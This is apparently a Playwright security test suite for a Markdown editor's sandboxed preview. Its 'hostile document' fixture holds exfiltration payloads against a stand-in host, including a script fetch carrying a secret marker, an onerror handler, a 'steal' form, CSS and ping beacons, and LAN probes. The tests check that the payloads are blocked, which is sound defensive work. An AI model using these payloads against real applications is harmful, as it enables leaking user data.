import { test, expect, type Page, type Request } from '@playwright/test';
import { openApp, openDoc, preview, setPermissions, dropFiles, PNG_1PX } from './helpers';

const SECRET = 'SECRET_MARKER_7f3a9c';
const ORIGIN = new URL(process.env.PW_BASE_URL || 'http://localhost:4173').origin;

const HOSTILE_DOC = `# ${SECRET}

password: ${SECRET}

![img](https://media.test/pic.png?id=tracking-pixel)
![video](https://media.test/clip.mp4)
![audio](https://media.test/song.mp3)
![lan](http://192.168.1.1/cam.png)
![local](http://localhost:9999/x.png)

[link](https://media.test/page?${SECRET})
[spoof](https://bank.com@media.test/)

<img src="https://media.test/raw.png" onerror="window.__pwned=1">
<video src="https://media.test/raw.mp4" poster="https://media.test/poster.png" autoplay></video>
<audio><source src="https://media.test/raw.ogg"></audio>
<iframe src="https://media.test/frame"></iframe>
<object data="https://media.test/obj"></object>
<embed src="https://media.test/embed">
<link rel="stylesheet" href="https://media.test/style.css">
<style>@import url(https://media.test/import.css); body{background:url(https://media.test/bg.png)}</style>
<p style="background-image:url(https://media.test/inline.png)">styled</p>
<img srcset="https://media.test/srcset.png 1x">
<picture><source srcset="https://media.test/pic.webp"><img src="https://media.test/fallback.png"></picture>
<form action="https://media.test/steal"><input name="q" value="${SECRET}"><button>go</button></form>
<meta http-equiv="refresh" content="0;url=https://media.test/refresh">
<base href="https://media.test/">
<script>fetch('https://media.test/js?${SECRET}')</script>
<svg><image href="https://media.test/svg.png"/></svg>
<a href="https://media.test/ping" ping="https://media.test/pingback">ping</a>

\`\`\`mermaid
flowchart LR
  A["<img src='https://media.test/mermaid.png'>"] --> B
\`\`\`

$\\href{https://media.test/katex}{x}$
`;

function trackRequests(page: Page) {
  const requests: Request[] = [];
  page.on('request', (r) => requests.push(r));
  return requests;
}

async function serveFakeExternalHost(page: Page) {
  const hits: string[] = [];
  await page.context().route(/^https?:\/\/(media\.test|example\.com|192\.168\.|localhost:9999)/, (route) => {
    hits.push(route.request().url());
    const url = route.request().url();
    if (/\.(png|webp)(\?|$)/.test(url)) {
      return route.fulfill({ status: 200, contentType: 'image/png', body: Buffer.from(PNG_1PX, 'base64') });
    }
    return route.fulfill({ status: 200, contentType: 'text/plain', body: 'ok' });
  });
  return hits;
}

test.describe('full protection (default)', () => {
  test('a hostile document causes no request outside the site, and the text never leaves the page', async ({ page }) => {
    const hits = await serveFakeExternalHost(page);
    const requests = trackRequests(page);
    let dialogs = 0;
    page.on('dialog', (d) => {
      dialogs++;
      d.dismiss();
    });
    await openApp(page);
    await openDoc(page, HOSTILE_DOC);
    await expect(preview(page).locator('.mermaid-block img, .mermaid-error').first()).toBeVisible();
    await page.waitForTimeout(1500);

    const foreign = requests.filter((r) => !r.url().startsWith(ORIGIN) && !r.url().startsWith('data:') && !r.url().startsWith('blob:'));
    expect(foreign.map((r) => r.url())).toEqual([]);
    expect(hits).toEqual([]);
    for (const r of requests) {
      expect(r.method()).toBe('GET');
      expect(r.url()).not.toContain(SECRET);
      expect(r.postData() ?? '').not.toContain(SECRET);
    }
    expect(dialogs).toBe(0);
    expect(await page.evaluate(() => (window as unknown as { __pwned?: number }).__pwned)).toBeUndefined();
    const frameWindowPwned = await page.evaluate(
      () => ((document.querySelector('.preview-frame') as HTMLIFrameElement).contentWindow as unknown as { __pwned?: number }).__pwned,
    );
    expect(frameWindowPwned).toBeUndefined();
  });

  test('the preview frame cannot run scripts even if markup gets through', async ({ page }) => {
    await openApp(page);
    const ran = await page.evaluate(async () => {
      const frame = document.querySelector('.preview-frame') as HTMLIFrameElement;
      const doc = frame.contentDocument!;
      const s = doc.createElement('script');
      s.textContent = 'parent.__frameScriptRan = true';
      doc.body.append(s);
      doc.body.insertAdjacentHTML('beforeend', '<img src="data:," onerror="parent.__frameScriptRan=true">');
      await new Promise((r) => setTimeout(r, 300));
      return (window as unknown as { __frameScriptRan?: boolean }).__frameScriptRan ?? false;
    });
    expect(ran).toBe(false);
    expect(await page.locator('.preview-frame').getAttribute('sandbox')).toBe('allow-same-origin allow-modals');
  });

  test('security headers are sent', async ({ request }) => {
    const app = await request.get('/');
    const csp = app.headers()['content-security-policy'];
    expect(csp).toContain("connect-src 'none'");
    expect(csp).toContain("default-src 'none'");
    expect(csp).toContain("frame-ancestors 'none'");
    expect(app.headers()['x-frame-options']).toBe('DENY');
    expect(app.headers()['referrer-policy']).toBe('no-referrer');
    expect(app.headers()['x-content-type-options']).toBe('nosniff');

    const strict = await request.get('/preview/p-00.html');
    const pcsp = strict.headers()['content-security-policy'];
    expect(pcsp).toContain("img-src 'self' data: blob:;");
    expect(pcsp).toContain("script-src 'none'");
    expect(pcsp).not.toContain('https:');

    const open = await request.get('/preview/p-11.html');
    expect(open.headers()['content-security-policy']).toContain("img-src 'self' data: blob: https:");
  });
});

test.describe('permissions', () => {
  test('ticking a permission unticks full protection and vice versa', async ({ page }) => {
    await openApp(page);
    await expect(page.locator('#protection-btn')).toHaveClass(/is-full/);
    await page.locator('#protection-btn').click();
    await page.locator('label:has(#prot-images)').click();
    await expect(page.locator('#prot-full')).not.toBeChecked();
    await expect(page.locator('#prot-images')).toBeChecked();
    await expect(page.locator('#protection-btn')).toHaveClass(/is-relaxed/);
    await expect(page.locator('.preview-frame')).toHaveAttribute('src', 'preview/p-10.html');

    await page.locator('label:has(#prot-links)').click();
    await page.locator('label:has(#prot-full)').click();
    await expect(page.locator('#prot-full')).toBeChecked();
    await expect(page.locator('#prot-images')).not.toBeChecked();
    await expect(page.locator('#prot-links')).not.toBeChecked();
    await expect(page.locator('.preview-frame')).toHaveAttribute('src', 'preview/p-00.html');

    // Unticking the last permission restores full protection.
    await page.locator('label:has(#prot-media)').click();
    await expect(page.locator('#prot-full')).not.toBeChecked();
    await page.locator('label:has(#prot-media)').click();
    await expect(page.locator('#prot-full')).toBeChecked();
  });

  test('allowing images loads safe external images only', async ({ page }) => {
    const hits = await serveFakeExternalHost(page);
    await openApp(page);
    await setPermissions(page, { images: true });
    await openDoc(page, HOSTILE_DOC);
    await expect(preview(page).locator('img[src^="https://media.test/pic.png"]')).toBeVisible();
    await page.waitForTimeout(1000);
    expect(hits.some((u) => u.startsWith('https://media.test/pic.png'))).toBe(true);
    // Never: local network, video/audio (no media permission), styles, forms, scripts, frames.
    for (const forbidden of ['192.168.', 'localhost:9999', '.mp4', '.mp3', '.ogg', 'style.css', 'import.css', 'bg.png', 'inline.png', 'srcset.png', 'pic.webp', 'steal', '/js', 'frame', 'obj', 'embed', 'refresh', 'svg.png', 'mermaid.png', 'katex', 'pingback', 'poster.png']) {
      expect(hits.filter((u) => u.includes(forbidden))).toEqual([]);
    }
    for (const u of hits) expect(u).not.toContain('SECRET_MARKER');
  });

  test('allowing media loads players without autoplay', async ({ page }) => {
    const hits = await serveFakeExternalHost(page);
    await openApp(page);
    await setPermissions(page, { media: true });
    await openDoc(page, HOSTILE_DOC);
    const video = preview(page).locator('video').first();
    await expect(video).toBeVisible();
    expect(await video.getAttribute('autoplay')).toBeNull();
    expect(await video.getAttribute('controls')).not.toBeNull();
    expect(hits.filter((u) => u.includes('pic.png'))).toEqual([]); // images still blocked
  });

  test('suspicious links ask for confirmation, safe links open in a new tab without referrer', async ({ page, context }) => {
    await serveFakeExternalHost(page);
    await openApp(page);
    await setPermissions(page, { links: true });
    await openDoc(page, '[safe](https://example.com/ok)\n\n[https://bank.example.com](https://bank-example.xyz/login)');

    await preview(page).locator('a', { hasText: 'bank.example.com' }).click();
    await expect(page.locator('dialog.dialog')).toContainText('Suspicious link');
    await expect(page.locator('dialog.dialog')).toContainText('The link text shows');
    await page.locator('dialog.dialog button', { hasText: 'Cancel' }).click();
    await expect(page.locator('dialog.dialog')).toHaveCount(0);
    expect(context.pages()).toHaveLength(1);

    const [popup] = await Promise.all([context.waitForEvent('page'), preview(page).locator('a', { hasText: 'safe' }).click()]);
    await popup.waitForLoadState();
    expect(popup.url()).toBe('https://example.com/ok');
    expect(await popup.evaluate(() => window.opener)).toBeNull();
    expect(await popup.evaluate(() => document.referrer)).toBe('');
  });
});

test.describe('storage', () => {
  test('document text is not stored in the browser unless explicitly enabled', async ({ page }) => {
    await openApp(page);
    await openDoc(page, `# ${SECRET}`);
    await page.locator('.cm-content').click();
    await page.keyboard.type(' typed');
    await page.waitForTimeout(800);

    const dump = async () =>
      page.evaluate(async () => {
        const dbs = (await indexedDB.databases?.()) ?? [];
        return JSON.stringify({ l: { ...localStorage }, s: { ...sessionStorage }, c: document.cookie, dbs });
      });
    const cookies = JSON.stringify(await page.context().cookies());
    expect(await dump()).not.toContain(SECRET);
    expect(cookies).toBe('[]');

    await page.locator('#settings-btn').click();
    await page.locator('#set-remember').check();
    await page.waitForTimeout(800);
    expect(await dump()).toContain(SECRET);

    await page.locator('#clear-all').click();
    await page.locator('dialog.dialog button', { hasText: 'Clear' }).click();
    await page.waitForTimeout(300);
    expect(await dump()).not.toContain(SECRET);
    await expect(page.locator('#set-remember')).not.toBeChecked();
    await expect(page.locator('.tab')).toHaveCount(1);
  });
});

test('no Content-Security-Policy violations during normal use', async ({ page }) => {
  const violations: string[] = [];
  page.on('console', (m) => {
    if (/Content Security Policy|Refused to/i.test(m.text())) violations.push(m.text());
  });
  await openApp(page);
  // Sample document already contains a diagram and formulas.
  await expect(preview(page).locator('.mermaid-diagram')).toBeVisible();
  await expect(preview(page).locator('math').first()).toBeAttached();
  await openDoc(page, '# t\n\n```js\nconst a = 1;\n```\n\n| a | b |\n|:-:|--:|\n| 1 | 2 |', [{ name: 'p.png', content: PNG_1PX, base64: true, type: 'image/png' }]);
  await page.locator('#theme-btn').click();
  await page.locator('.tool-advanced-toggle').click();
  await setPermissions(page, { images: true, media: true, links: true });
  await page.waitForTimeout(800);
  expect(violations).toEqual([]);
});

test('files dropped outside the editor do not navigate the page away', async ({ page }) => {
  await openApp(page);
  await dropFiles(page, '.statusbar', [{ name: 'x.md', content: '# dropped' }]);
  await expect(page.locator('.toast')).toContainText('Drop files onto the editor');
  expect(page.url()).toBe(`${ORIGIN}/`);
  await expect(page.locator('.tab')).toHaveCount(1);
});
